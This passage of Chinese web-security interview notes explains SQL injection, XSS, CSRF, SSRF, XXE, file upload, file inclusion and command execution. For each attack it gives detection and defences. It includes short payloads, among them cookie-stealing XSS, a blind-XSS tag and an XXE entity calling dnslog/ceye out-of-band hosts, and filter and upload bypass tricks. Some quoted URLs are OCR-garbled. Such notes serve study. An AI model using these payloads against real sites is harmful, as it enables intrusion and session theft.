<dt>如何判断是否存在SQL注入</dt><dd><p>
and 1=1/and 1=2 回显页面不同
</p>

<p>
单引号或双引号判断
</p>

<p>
and sleep() 判断页面返回时间
</p></dd>
</dl></dd>

<dt>SQL注入如何防御？预编译的原理是什么呢？</dt><dd><ul class="org-ul">
<li><p>
代码层面
</p>

<p>
1.对输入进行严格的过滤和转义（正则表达式过滤）
</p>

<p>
2.使用预编译和参数化查询
</p>

<p>
<b>预编译就是提前进行sql的编译，在sql语句执行之前就确定sql的语义，保
证用户输入的内容只当作变量执行，而不是sql语句执行。</b>
</p>

<p>
数据库以参数化的形式进行查询，即使传递来的敏感字符也不会被执行，而是被当作参数处理；
</p>

<p>
是通过PreparedStatement和占位符来实现的，也就是说其后注入进来的参
数系统将不会认为它会是一条SQL语句，而默认其是一个参数，参数中的or
或者and 等就不是SQL语法保留字了
</p></li>

<li><p>
网络层面
</p>

<p>
利用WAF防御；使用安全的API
</p></li>
</ul></dd>

<dt>SQL注入如何判断数据库类型？ </dt><dd><ol class="org-ol">
<li><p>
注释符判断
</p>

<p>
/ * 是MySQL的注释符，返回错误说明该注入点不是MySQL
</p>

<p>
&#x2013; 是Oracle和SQL Server的注释符，如果返回正常，说明为这两种数据库类型之一
</p>

<p>
；  是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明很可能是Oracle数据库
</p></li>

<li><p>
函数判断, 如len()和length()，version()和@@version等
</p>

<p>
len()：mssql和mysql以及db2返回长度的函数
</p>

<p>
length()：Oracle和INFORMIX返回长度的函数
</p>

<p>
version()：MySQL查询版本信息的函数
</p>

<p>
@@version()：MySQL和SQL Server查询版本信息的函数
</p></li>

<li>报错信息判断</li>

<li>默认端口判断</li>
</ol></dd>

<dt>判断数据库类型语句</dt><dd><p>
Oracle数据库
</p>

<p>
<a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and (select count(*) from sys.user_tables)&gt;0 and 1=1
</p>

<p>
Mysql数据库（版本5.0以上）
</p>

<p>
<a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and (select count(*) from information_schema.TABLES)&gt;0 and 1=1
</p>

<p>
mssql数据库
</p>

<p>
<a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and (select count(*) from sysobjects)&gt;0 and 1=1
</p></dd>

<dt>(no term)</dt><dd><p>
SQL注入如何绕过？
</p>

<p>
大小写绕过(UNiOn)，双写绕过(ununionion)，编码绕过（base64、url全编码），内联注释绕过（/*! Union */）
</p>

<p>
【逗号绕过：join，from ；  空格绕过：/**/，%a0=空格，括号（），+加号；   引号绕过：16进制 】
</p>

<p>
【比较符&gt;&lt;绕过：greatest（返回最大值），least（返回最小值）；  逻辑符号替换and=&amp;&amp; or=||，】
</p></dd>
</dl>



<p>
分块传输：通过在头部加入 Transfer-Encoding: chunked 之后，就代表这个报
文采用了分块编码。每个分块包含十六进制的长度值和数据，长度值独占一行，
长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示
结束
</p>


<p>
参数污染 / 超大包传输:
</p>
</div>
</div>
<div id="outline-container-h:a914f1c7-7881-4207-bb3d-d74a54feeee6" class="outline-4">
<h4 id="h:a914f1c7-7881-4207-bb3d-d74a54feeee6">XSS(跨站脚本攻击)部分</h4>
<div class="outline-text-4" id="text-h:a914f1c7-7881-4207-bb3d-d74a54feeee6">
<dl class="org-dl">
<dt>XSS的原理是什么？</dt><dd>攻击者在WEB页面中插入恶意js代码，使用户在访问时触发，使其信息泄露</dd>

<dt>XSS危害？</dt><dd><p>
主要是盗取管理员的会话和cookie信息，钓鱼
</p>

<p>
D-doss攻击，网页挂马；传播跨站脚本蠕虫等
</p></dd>

<dt>XSS的三种类别有什么不同？</dt><dd><ul class="org-ul">
<li><p>
反射型：发出请求时，XSS代码出现在url中，作为输入提交到服务器，服务
器解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执
行XSS代码。这个过程像一次反射，所以叫反射型XSS
</p>

<p>
这种攻击方式往往具有一次性，只在用户单击时触发，需要诱骗用户点击。
</p>

<p>
<b>数据流向是：浏览器 -&gt; 后端 -&gt; 浏览器</b>
</p>

<p>
<b>常见注入点：</b> 网站的搜索栏、用户登录入口、输入表单等地方，常用来窃取客户端cookies或钓鱼欺骗。
</p></li>

<li><p>
存储型：攻击者已经通过XSS将恶意脚本放入服务器端(数据库，内存，文件
系统等)只要每次浏览这个网页就会触发恶意脚本。 <b>浏览器 -&gt; 后端 -&gt;
数据库 -&gt; 后端 -&gt; 浏览器</b>
</p>

<p>
<b>常见注入点：</b> 论坛、博客、留言板、网站的留言、评论、日志等交互处。
</p></li>

<li><p>
DOM型：基于DOM文档对象模型的一种XSS漏洞，是从客户端获得 DOM 中的数
据（如从 URL 中提取数据）并在本地执行；DOM型XSS其实是一种特殊类型
的反射型XSS，是基于js上的，不需要与服务器进行交互；纯前端的XSS漏洞，
直接通过浏览器进行解析，就完成攻击。
</p>

<p>
URL&#x2013;&gt;浏览器。javascript:alert("You are attacked !!")
</p></li>
</ul></dd>

<dt>反射型 存储型 DOM型 的区别</dt><dd><p>
存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里
</p>

<p>
DOM 型 取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的
安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞
</p></dd>

<dt>常用语句：</dt><dd><pre class="example" id="org66de886">
&lt;script&gt;alert(/xss/)&lt;/script&gt; 弹窗

&lt;script&gt;confirm(/xss/)&lt;/script&gt; 弹窗

&lt;script&gt;prompt(/xss/)&lt;/script&gt; 弹窗

&lt;script&gt;alert(document.cookie)&lt;/script&gt; 获取CK

&lt;img src = 1 onerror = alert(document.cookie)&gt; 事件驱动获取CK

&lt;a href=javascript:alert(111)&gt;

&lt;body onload=alert('XSS')&gt;

&lt;div onclick="alert('xss')"&gt;事件绕过
</pre></dd>
</dl>


<dl class="org-dl">
<dt>XSS盲打</dt><dd><p>
将xss的攻击代码拼接到dnslog网址的高级域名上，就可以在用户访问的时候，
将他的信息带回来; 通过盲打，让触发者浏览器访问预设至的链接地址，如果
盲打成功，会在平台上收到如下的链接访问记录
</p>

<p>
先申请一个域名，向有XSS的地方注入下面语句
</p>

<p>
<code>&lt;img src=http://xss. j71zkv.dnslog.cn&gt;</code>
</p>

<p>
对插入的地址进行请求，然后回看DNSlog平台，发现被解析
</p></dd>
</dl>


<ul class="org-ul">
<li>XSS如何防御？（总体思路就是 对输入进行过滤，对输出进行编码）

<ul class="org-ul">
<li>对输入进行过滤（用户输入，URL参数，POST请求参数）：一般过滤掉双引号，单引号，尖括号，&amp;符号</li>

<li><p>
对输出进行HTML实体编码：双引号（”）&amp;quot;，左尖括号（&lt;）&amp;lt;，右尖括号（&gt;）：&amp;gt
</p>

<p>
使脚本无法在浏览器中执行。php中的htmlspecialchars函数
</p></li>

<li>添加HttpOnly：在cookie里面设置HttpOnly属性，那么js脚本将无法访问到
cookie，但是这个方法也只能是防御cookie劫持</li>

<li>CSP内容安全策略：本质上是建立白名单，规定了浏览器只能够执行特定来
源的代码；即使发生了xss攻击，也不会加载来源不明的第三方脚本

<ul class="org-ul">
<li><p>
CSP的分类：
</p>

<p>
1.Content-Security-Policy：配置好并启用后，不符合 CSP 的外部资源就会被阻止加载。
</p>

<p>
2.Content-Security-Policy-Report-Only：表示不执行限制选项，只是
记录违反限制的行为。它必须与report-uri选项配合使用
</p></li>

<li><p>
csp使用：
</p>

<p>
1.在HTTP Header上使用（首选）2.在HTML上使用
</p></li>
</ul></li>
</ul></li>

<li><p>
Httponly绕过
</p>

<p>
可以直接拿账号密码，cookie登录.
</p>

<p>
浏览器未保存读取密码:需要xss产生于登录地址，利用表单劫持
</p>

<p>
浏览器保存账号：产生在后台的XSS，例如存储型XSS
</p>

<ol class="org-ol">
<li><p>
CVE-2012-0053
</p>

<p>
Apache服务器2.0-2.2版本存在个漏洞 CE-2012-0053:攻击者可通过向网站
植人超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize (最
大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了
HttpOnly 保护的Cookie。源代码可参见: htps:/ww.explwi
db.com/exploits/18442/。
</p>

<p>
除了Apache，-些其他的 Web服务器在使用者不了解其特性的情况下，也很
容易出现HttpOnly保护的Cookie被爆出的情况，例如Squid等
</p></li>

<li><p>
PHPINFO页面/
</p>

<p>
无论是否设置了HttpOnly 属性，phpinfo() 函数都会输出当前请求上下文
的Cookie信息。如果目标网站存在PHPINFO页面，就可以通过
XMLHttpRequest请求该页面获取Cookie信息。
</p></li>

<li><p>
Flash/Java
</p>

<p>
安全团队seckb在2012年提出，通过Flash、Java 的一些API可以获取到HttpOnly Cookie,
这种情况可以归结为客户端的信息泄露，链接地址为: <a href="http://ckb.yehg.net/2012/0/xss-gaining-g">http://ckb.yehg.net/2012/0/xss-gaining-g</a>
aCss-t-ttponly-cookie.html。
</p></li>
</ol></li>

<li>Xss设置了httponly如何利用</li>
</ul>
</div>
</div>
<div id="outline-container-h:ca475bb0-c381-46a0-9e0c-1fce059fd0e5" class="outline-4">
<h4 id="h:ca475bb0-c381-46a0-9e0c-1fce059fd0e5">CSRF(跨站请求伪造)</h4>
<div class="outline-text-4" id="text-h:ca475bb0-c381-46a0-9e0c-1fce059fd0e5">
<ul class="org-ul">
<li><p>
CSRF的原理
</p>

<p>
利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作
</p>

<p>
攻击者 盗用 用户未失效的身份认证信息（cookie、会话等），发送恶意请求
</p>

<p>
通常是伪造一个链接，然后欺骗目标用户点击，用户一旦点击，攻击也就完成了
</p></li>

<li>CSRF的防御方法有哪些？referer验证和token哪个安全级别高呢？

<ol class="org-ol">
<li>验证http Referer 字段：同源检测，Referer 指的是页面请求来源。意思
是，只接受本站的请求，服务器才做响应；如果不是，就拦截。Referer的
值是由浏览器提供的</li>

<li>在请求地址中添加Token并验证：在 HTTP 请求中以参数的形式加入一个随机产生的token；如果请求中没有 token 或者 token 内容不正确，则认为 CSRF 攻击而拒绝该请求</li>

<li><p>
在http头中自定义属性并验证：
</p>

<p>
token安全等级更高。因为并不是任何服务器都可以取得referer，如果从
HTTPS跳到HTTP，也不会发送referer。并且Referer 的值是可以通过抓包
修改的，但是token的话，能保证其足够随机且不可泄露。(不可预测性原
则)
</p></li>
</ol></li>
</ul>


<p>
一般防护csrf的办法最常见的就是增加原始密码验证，短信验证、验证码验证，这样基本就很难进行scrf攻击了。
</p>

<ul class="org-ul">
<li>CSRF如何判断

<ul class="org-ul">
<li><p>
GET类型的CSRF的检测
</p>

<p>
如果有token等验证参数，先去掉参数尝试能否正常请求。如果可以，即存在CSRF漏洞
</p></li>

<li><p>
POST类型的CSRF的检测
</p>

<p>
如果有token等验证参数，先去掉参数尝试能否正常请求。如果可以，再去掉referer参数的内容，如果仍然可以，说明存在CSRF漏洞，如果直接去掉referer参数请求失败，这种还可以继续验证对referer的判断是否严格，是否可以绕过。
</p></li>

<li><p>
特殊情况的POST类型的CSRF检测
</p>

<p>
如果上述post方式对referer验证的特别严格，有的时候由于程序员对请求类型判断不是很严格，可以导致post请求改写为get请求，从而CSRF。直接以get请求的方式进行访问，如果请求成功，即可以此种方式绕过对referer的检测，从而CSRF。
</p></li>
</ul></li>

<li><p>
CSRF与XSS区别
</p>

<p>
CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，实施破坏 
</p>

<p>
CSRF需要用户先登录网站A,获取cookie; XSS不需要登录。
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:231a41df-8e0d-4662-8717-680f66edd7f1" class="outline-4">
<h4 id="h:231a41df-8e0d-4662-8717-680f66edd7f1">SSRF(服务端 请求伪造)部分</h4>
<div class="outline-text-4" id="text-h:231a41df-8e0d-4662-8717-680f66edd7f1">
<p>
由于 <b>服务端提供了从其他服务器应用获取数据的功能</b> ，但又没有对目标地址做过滤与限制，导致攻击者可以传入任意的地址 让后端服务器对其发起请求,并返回对该目标地址请求的数据
</p>

<p>
数据流: <b>攻击者&#x2013;&#x2014;&gt;服务器-&#x2014;&gt;目标地址</b>
</p>

<p>
比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等
</p>

<ul class="org-ul">
<li><p>
危害
</p>

<p>
内外网的端口和服务扫描
</p>

<p>
攻击运行在内网或本地的应用程序
</p>

<p>
对内网web应用进行指纹识别，识别企业内部的资产信息
</p>

<p>
攻击内网的web应用主要是使用GET参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）
</p>

<p>
利用file协议读取本地敏感数据文件等
</p></li>

<li><p>
利用
</p>

<p>
File协议：从文件系统中获取文件内容，如<a href="file:///d:/etc/passwd">file:///d:/etc/passwd</a>
</p>

<p>
dict协议：字典服务器协议，用来获取目标服务器上运行的服务版本等信息
</p>

<p>
gopher协议：分布式的文档传递服务，使用SSRF结合gopher协议可以发送http、mysql等请求
</p>

<p>
ftp、ftps：FTP匿名访问、爆破
</p></li>

<li><p>
危险函数
</p>

<p>
file_get_contents()  对本地和远程的文件进行读取
</p>

<p>
fsockopen()
</p>

<p>
curl_exec()
</p></li>

<li><p>
绕过姿势
</p>

<p>
302跳转：可以使用重定向的方式绕过SSRF
</p>

<p>
短链接：制作一个短链接指向内网IP，如<a href="http://dwz.cn/11SMa">http://dwz.cn/11SMa</a>  &#x2013;&gt; <a href="http://127.0.0.1">http://127.0.0.1</a>
</p>

<p>
利用@：如访问<a href="http://example.com@127.0.0.1">http://example.com@127.0.0.1</a>
</p>

<p>
添加端口号：<a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a>
</p>

<p>
IP地址的进制转换：8进制，16进制，10进制
</p>

<p>
dns解析：如果目标对域名或者IP进行了限制，那么可以使用dns服务器将自己的域名解析到内网ip
</p></li>

<li>如何判断SSRF

<ul class="org-ul">
<li>回显判断：有返回请求结果 并会显示出来，这种比较好判断</li>
<li>延时对比：对比访问不同 IP/域名的访问时长，比如对百度与 Google（国内访问受限）的访问时间，访问百度的时间通常比Google快，若是则可能存在漏洞</li>
<li>DNSlog请求检测：利用 DNSLog 服务生成一个域名用于伪造请求，看漏洞服务器是否发起 DNS 解析请求，若成功访问在 <a href="http://dnslog.cn">http://dnslog.cn</a>  上就会有解析日志<a href="http://172.16.29.2/ssrf_test.php?url=http://02c6ot.dnslog.cn">http://172.16.29.2/ssrf_test.php?url=http://02c6ot.dnslog.cn</a></li>
<li>访问日志检查：伪造请求到自己控制的公网服务器，然后在服务器上查看访问日志是否有来自漏洞服务器的请求，或者直接使用命令“nc -lvp”来监听请求。</li>
</ul></li>

<li>漏洞位置

<ul class="org-ul">
<li>能够对外发起网络请求的地方</li>
<li>分享：通过URL地址分享网页内容</li>
<li>在线处理工具</li>
<li>转码服务</li>
<li>在线翻译</li>
<li>图片加载与下载：通过URL地址加载或下载图片</li>
<li>图片、文章收藏功能</li>
<li>未公开的api实现以及其他调用URL的功能</li>
<li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li>
<li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li>
<li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li>
<li>邮件系统就是接收邮件服务器地址这些地方。</li>
<li>文件就找ImageMagick，xml这些。</li>
<li>从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。</li>
</ul></li>

<li>防御

<ul class="org-ul">
<li>过滤返回的信息，把返回结果展示给用户之前先验证返回的信息是否符合标准</li>
<li>统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态</li>
<li>限制请求的端口，比如80,443,8080,8090</li>
<li>禁止不常用的协议 仅仅允许http和https请求。可以防止类似于<a href="file:///d:/,gopher:/,ftp:/等引起的问题">file:///d:/,gopher:/,ftp:/等引起的问题</a></li>
<li>使用DNS缓存或者Host白名单的方式。</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:02320151-06a0-488c-9048-1c87ec042d2e" class="outline-4">
<h4 id="h:02320151-06a0-488c-9048-1c87ec042d2e">XML注入（XXE）XML是一种用来传输和存储数据的可扩展标记语言</h4>
<div class="outline-text-4" id="text-h:02320151-06a0-488c-9048-1c87ec042d2e">
<ul class="org-ul">
<li><p>
原理
</p>

<p>
XML外部实体注入，由于在服务端开启了DTD外部引用 且 没有对DTD对象进行过滤的情况下,  导致可以利用DTD引用系统关键文件，漏洞触发的点往往是可以上传xml文件的位置
</p></li>

<li><p>
危害
</p>

<p>
1：读取任意文件  2：执行系统命令  3：探测内网端口  4：攻击内网网站
</p></li>

<li><p>
如何判断
</p>

<p>
有回显：抓包随意修改XML标签，看是否输出，有的话则存在XXE
</p>

<p>
无回显：换成自己申请的域名，然后提交，查看是否产生日志，有的话说明有XXE
</p>

<div class="org-src-container">
<pre class="src src-xml"><span style="color: #000000; background-color: #ffffff;">&lt;?</span><span style="color: #a020f0;">xml</span> <span style="color: #8b2252;">version="1.0" </span><span style="color: #000000; background-color: #ffffff;">?&gt;</span>
&lt;!<span style="color: #000000; background-color: #ffffff;">DOCTYPE r [</span>
&lt;!<span style="color: #000000; background-color: #ffffff;">ELEMENT r ANY &gt;</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-xml">&lt;!<span style="color: #000000; background-color: #ffffff;">ENTITY sp SYSTEM "http://k720ih.ceye.io/test.txt"&gt;</span>
<span style="color: #000000; background-color: #ffffff;">]&gt;</span>
<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">r</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #008b8b;">&amp;</span><span style="color: #008b8b;">sp</span><span style="color: #008b8b;">;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">r</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
</pre>
</div></li>

<li>防御

<ul class="org-ul">
<li><p>
禁止外部实体加载：libxml_disable_entity_loader(true);将false不禁止外部实体加载，改为true禁止外部实体加载
</p>

<div class="org-src-container">
<pre class="src src-sh">//php:
<span style="color: #0000ff;">libxml_disable_entity_loader</span>(true);

//java:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
<span style="color: #0000ff;">dbf.setExpandEntityReferences</span>(false);

//Python&#65306;
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(<span style="color: #a0522d;">resolve_entities</span>=False))
</pre>
</div></li>

<li>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:f4e477ce-74a9-4906-8300-5deb2fefdc9b" class="outline-4">
<h4 id="h:f4e477ce-74a9-4906-8300-5deb2fefdc9b">文件上传部分</h4>
<div class="outline-text-4" id="text-h:f4e477ce-74a9-4906-8300-5deb2fefdc9b">
<ul class="org-ul">
<li><p>
文件上传漏洞原理
</p>

<p>
文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能，
上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力。
</p></li>

<li><p>
文件上传危害
</p>

<p>
上传webshell,控制服务器、远程命令执行
</p>

<p>
上传系统病毒、木马文件进行挖矿、僵尸网络
</p>

<p>
进行提权操作
</p>

<p>
修改web页面，实现钓鱼、挂马等操作。
</p>

<p>
进行内网渗透。
</p></li>

<li>文件上传 利用条件？

<ol class="org-ol">
<li>网站上传功能能正常使用</li>
<li>文件类型允许上传</li>
<li>传路径可以确定</li>
<li>文件可以被访问或者被包含</li>
</ol></li>

<li>文件上传如何防护？

<ol class="org-ol">
<li>文件上传目录设置为不可执行：只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</li>

<li>判断文件类型：结合使用MIME Type、后缀检查等方式（白名单）</li>

<li>图片二次渲染：使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</li>
</ol></li>

<li>文件上传常见的绕过方法

<ol class="org-ol">
<li>客户端绕过（前端验证，还未发送数据包）
<ol class="org-ol">
<li>浏览器禁用JS脚本</li>
<li>利用 burp 抓包修改后缀名，先将文件重命名为js允许的后缀名 burp发送数据包时候改成我们想要的后缀</li>
<li>按F12直接删除代码中onsubmit事件中关于文件上传时验证上传文件的相关代码</li>
</ol></li>
<li>服务端绕过
<ol class="org-ol">
<li>白名单：
<ul class="org-ul">
<li>MIME绕过：修改为image/jpeg；image/png；image/gif等允许上传的MIME值；</li>
<li><p>
%00截断：a.asp%00.jpg 就会变成a.asp，后面的.jpg就会被%00截断了。
</p>

<p>
有些时候数据包中必须含有上传文件后的目录情况才可以用
</p></li>
</ul></li>

<li>黑名单：
<ol class="org-ol">
<li>特殊文件名绕过：Phtml,php3,php5</li>
<li>配合解析漏洞绕过</li>
<li>后缀大小写绕过</li>
<li>双写绕过：pphphp</li>
<li><p>
上传.htaccess绕过：先上传一个.htaccess文件，然后上传一句话木马
</p>

<p>
（.htaccess就是该目录的所有文件可以php文件执行）
</p></li>

<li>空格绕过：后缀名加空格</li>
<li>点绕过：后缀名中增加.号，windows 系统中会自动去除最后的点号</li>
<li><code>:: $DATA</code> 绕过：在php+windows的情况下，文件名+“::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名. 且保持"::$DATA"之前的文件。可在后缀名中加“::$DATA”绕过</li>
</ol></li>

<li>检查内容：

<ol class="org-ol">
<li>二次渲染：根据用户上传的图片 网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，根据原有的图片新生成一个图片，将原始图片删除，将新图片添加到数据库中对于不同的图片，修改的位置还不一样
<ol class="org-ol">
<li>如何判断二次渲染：对比要上传图片与上传后的图片大小，编辑器打开图片查看上传后保留了拿些数据</li>
<li>绕过：通过对比上传前和上传后的两个文件，看图片的16进制编码，在没有改变的地方插入php一句话</li>
</ol></li>
<li><p>
图片码绕过：判断文件头信息，把一句话木马插入到图片中然后上传 
</p>

<p>
getimagesize()，exif_imagetype()
</p></li>

<li>其他：
<ol class="org-ol">
<li>条件竞争：先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可；目的就是在文件还存在时执行一段php代码</li>
</ol></li>
</ol></li>
</ol></li>
</ol></li>
</ul>
</div>
</div>
<div id="outline-container-h:9850a317-af0b-471e-8538-b067840f597a" class="outline-4">
<h4 id="h:9850a317-af0b-471e-8538-b067840f597a">文件包含部分</h4>
<div class="outline-text-4" id="text-h:9850a317-af0b-471e-8538-b067840f597a">
<ul class="org-ul">
<li><p>
原理
</p>

<p>
服务器解析执行php文件时能够通过包含函数加载另外一个文件中的php代码，当被包含的文件中存在木马时，也就意味着木马程序会在服务器上加载执行。
</p></li>

<li>分类

<ul class="org-ul">
<li>本地文件包含：就是在网站服务器本身存在恶意文件，然后利用本地文件包含使用</li>
<li>远程文件包含：远程文件包含就是调用其他网站的恶意文件进行打开</li>
</ul></li>

<li><p>
文件包含的函数有哪些？include和require的区别
</p>

<p>
include( )：找不到被包含的文件，只会报错，但会继续运行脚本
</p>

<p>
include_once( )：功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次
</p>

<p>
require( )：找不到被包含的文件，报错，并且停止运行脚本
</p>

<p>
require_once( )：功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次
</p>

<ul class="org-ul">
<li><p>
区别
</p>

<p>
inlude :包含的文件不存在，程序会继续执行
</p>

<p>
require:包含文件不存在，程序停止执行
</p></li>
</ul></li>

<li>文件包含怎么利用

<ol class="org-ol">
<li>包含系统敏感文件：如/etc/passwd（用户信息）；/etc/shadow（密码文件）</li>
<li>配合文件上传图片码getshell</li>
<li>包含Apache日志文件：access.log</li>
<li>利用php伪协议进行攻击：php://input (将post请求的数据当作php代码执行，达到命令执行)； php://filter（可以获取指定文件源码）</li>
</ol></li>

<li><p>
php伪协议：
</p>

<p>
<a href="file://">file://</a> 访问本地文件系统
</p>

<p>
<a href="http://">http://</a> 访问 HTTPs 网址
</p>

<p>
<a href="ftp://">ftp://</a> 访问 ftp URL
</p>

<p>
php:// 访问输入输出流
</p>

<p>
zlib:// 压缩流
</p>

<p>
data:// 数据
</p>

<p>
ssh2:// security shell2
</p>

<p>
expect:// 处理交互式的流
</p>

<p>
glob:// 查找匹配的文件路径
</p></li>

<li>防御

<ul class="org-ul">
<li>设置白名单：限制被包含的文件只能在某一个文件夹内</li>
<li>关闭危险配置：PHP配置中php.ini关闭远程文件包含功能</li>
<li>( allow_url_include = Off   allow_url_fopen= Off  )</li>
<li>路径限制：禁止目录跳转字符，参数中不允许出现../之类的目录跳转符。</li>
</ul></li>

<li><p>
需要开启的配置
</p>

<p>
php.ini的allow_url_fopen （打开文件）和allow_url_include（引用文件）设置为On，不然会影响伪协议的使用。
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:23ce296f-8b80-49c1-ae61-7bd1b1bef2bf" class="outline-4">
<h4 id="h:23ce296f-8b80-49c1-ae61-7bd1b1bef2bf">会话固定</h4>
<div class="outline-text-4" id="text-h:23ce296f-8b80-49c1-ae61-7bd1b1bef2bf">
<p>
会话固定也可以是会话劫持的一种类型，主要目的是获得用户的合法会话。用户在登录前和登录后的session的id 不会改变，窃取用户的cookie,用于模仿合法用户，还可以强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。
</p>

<ul class="org-ul">
<li><p>
防御
</p>

<p>
在用户登录成功后重新创建一个session id
</p>

<p>
登录前的匿名会话强制失效
</p>

<p>
session id与浏览器绑定：session id与所访问浏览器有变化，立即重置
</p>

<p>
session id与所访问的IP绑定：session id与所访问IP有变化，立即重置
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:ca1b6476-5737-4302-9a8f-938f71c62cd3" class="outline-4">
<h4 id="h:ca1b6476-5737-4302-9a8f-938f71c62cd3">暴力破解</h4>
<div class="outline-text-4" id="text-h:ca1b6476-5737-4302-9a8f-938f71c62cd3">
<p>
暴力破解又被称为穷举破解，即将密码进行逐个尝试直到找出真正的密码为止
</p>

<ul class="org-ul">
<li>防护手段：锁定账户  验证码</li>
</ul>
</div>
</div>
<div id="outline-container-h:1d617823-3710-4f8c-971d-ed878e2331b2" class="outline-4">
<h4 id="h:1d617823-3710-4f8c-971d-ed878e2331b2">命令注入</h4>
<div class="outline-text-4" id="text-h:1d617823-3710-4f8c-971d-ed878e2331b2">
<p>
由于web应用在服务器上拼接系统命令并且没有对用户的输入做严格的过滤造成的
</p>

<ul class="org-ul">
<li><p>
技巧  &amp;&amp;（与） ||(或)
</p>

<ul class="org-ul">
<li><p>
Windows系统支持的管道符如下：
</p>

<p>
“|”：直接执行后面的语句。
</p>

<p>
“||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。
</p>

<p>
“&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。
</p>

<p>
“&amp;&amp;”：前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。
</p></li>

<li>Linux系统支持的管道符如下：</li>
</ul>

<p>
“;”：执行完前面的语句再执行后面的语句。
</p>

<p>
“|”：显示后面语句的执行结果
</p></li>

<li><p>
防御
</p>

<p>
白名单校验命令参数
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:c651d200-c302-4d47-9be1-b501f6c5d7b3" class="outline-4">
<h4 id="h:c651d200-c302-4d47-9be1-b501f6c5d7b3">代码执行</h4>
<div class="outline-text-4" id="text-h:c651d200-c302-4d47-9be1-b501f6c5d7b3">
<p>
靠脚本代码调用操作系统的命令；当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞
</p>

<ul class="org-ul">
<li>常见的代码执行函数：
<code>eval() assert() call_user_func() create_function() array_map()</code></li>
</ul>


<ul class="org-ul">
<li>防御

<ul class="org-ul">
<li>使用参数白名单
在代码或配置文件中设置可输入的参数白名单，如果不在白名单列表中则提示错误。</li>
<li>严禁带入用户输入
用户的输入都是不可信的，通常这写函数关键字在使用时尽量不要带入用户输入。</li>
<li>过滤转义
字符串使用单引号包括可控代码，插入前使用addslashes（单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符））转义。</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:0ab9fbd8-b5b9-4621-8c8e-20163e73dbb9" class="outline-4">
<h4 id="h:0ab9fbd8-b5b9-4621-8c8e-20163e73dbb9">命令执行</h4>
<div class="outline-text-4" id="text-h:0ab9fbd8-b5b9-4621-8c8e-20163e73dbb9">
<p>
直接调用操作系统的命令
</p>

<ul class="org-ul">
<li><p>
常见的命令执行函数：
</p>

<p>
system(),passthru(),exec(),pcntl_exec(),shell_exec(),popen(),proc_open(),`(反单引号),ob_start(),php mail()
</p></li>

<li>防御

<ul class="org-ul">
<li><p>
使用过滤函数
</p>

<p>
内置函数 escapeshellcmd(), escapeshellarg() ,过滤和转义输入中的特殊字符
</p>

<p>
escapeshellcmd()：会在以下字符之前插入反斜线（\）： &amp;#;`|*?~&lt;&gt;^()[]{}$\,\x0A和\xFF 。'和"仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
</p>

<p>
escapeshellarg()：将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。
</p>

<p>
